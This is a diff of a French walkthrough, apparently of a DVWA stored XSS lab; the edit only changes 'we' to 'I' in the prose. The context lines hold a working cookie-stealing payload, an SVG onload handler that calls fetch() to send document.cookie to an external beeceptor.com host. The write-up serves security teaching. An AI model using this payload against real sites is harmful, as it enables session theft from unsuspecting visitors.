@@ -8,7 +8,7 @@ Si le filtrage s'effectue seulement sur les balises `<script>` `</script>`, il e
 
 ![](../../../../.gitbook/assets/1c414ec534804f56590077f87b46f6a6.png)
 
-C'est bien le cas, on ajoute notre payload de vol de cookies :
+C'est bien le cas, j'ajoute ma payload de vol de cookies :
 
 ```markup
 <svg onload="fetch('https://dvwaxssrefl.free.beeceptor.com?cookie=' + document.cookie);">
@@ -16,7 +16,6 @@ C'est bien le cas, on ajoute notre payload de vol de cookies :
 
 ![](../../../../.gitbook/assets/93fdbc43b069de2a852b36435ee8ef1e.png)
 
-Lorsqu'un visiteur lira le message, notre serveur malicieux listera les cookies reçues :
+Lorsqu'un visiteur lira le message, mon serveur malicieux listera les cookies reçues :
 
 ![](../../../../.gitbook/assets/6ac757d465641780b382d68c799f214f.png)
-
